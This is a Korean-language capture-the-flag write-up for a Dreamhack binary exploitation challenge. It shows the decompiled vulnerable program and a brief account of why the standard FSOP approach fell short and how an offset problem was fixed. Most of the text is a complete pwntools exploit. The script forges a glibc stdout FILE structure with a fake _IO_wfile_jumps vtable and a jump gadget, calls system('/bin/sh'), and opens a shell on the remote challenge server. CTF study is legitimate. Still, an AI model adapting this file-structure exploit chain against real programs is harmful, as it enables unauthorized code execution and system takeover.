```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("%p\n", _bss_start);
  read(0, _bss_start, 224uLL);
  puts("modify finished!");
  _exit(0);
}
```

문제의 코드는 엄청 간단하다. _bss_start 주소를 주고, 이를 통해 libc 베이스를 계산할 수 있다. 또한 우리는 stdout 구조체를 조작할 수 있기 때문에 이전에 풀었던 문제들처럼 FSOP를 하는 것이라고 생각했다.

그런데 224만큼 입력을 받기 때문에 페이로드가 중간에 짤려서 vtable을 덮지 못해 우리가 원하는 함수를 호출할 수 없다.

그래서 어떻게 해야하나 하고 자료를 찾던 중 위의 깃헙을 찾을 수 있었다.. 

이를 통해서 로컬에서는 쉘을 딸 수 있었지만 리모트에서는 안따졌다…

결국 디버깅해보면서 확인하니까 오프셋 문제였다.


```python
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
p = remote("host3.dreamhack.games", 16388)
#p = process("./prob")
e = ELF('./prob', checksec=False)
libc = ELF('./libc.so.6', checksec=False)  #local
bss_start = p.recvline()
bss_start = bss_start.split(b'\n')[0]
bss_start = int(bss_start, 16)
print(f"bss_start: {(hex(bss_start))}")
libc_base = bss_start - libc.sym['_IO_2_1_stdout_']
print(f"libc_base: {(hex(libc_base))}")
stdout_lock = libc_base + 0x21BA70 #0x21ca70   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
print(f"stdout : {hex(stdout)}")
fake_vtable = libc_base + libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc_base + 0x0000000000163830  #0x169820 # add rdi, 0x10 ; jmp rcx
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc_base+libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
p.sendline(bytes(fake))
p.interactive()
```
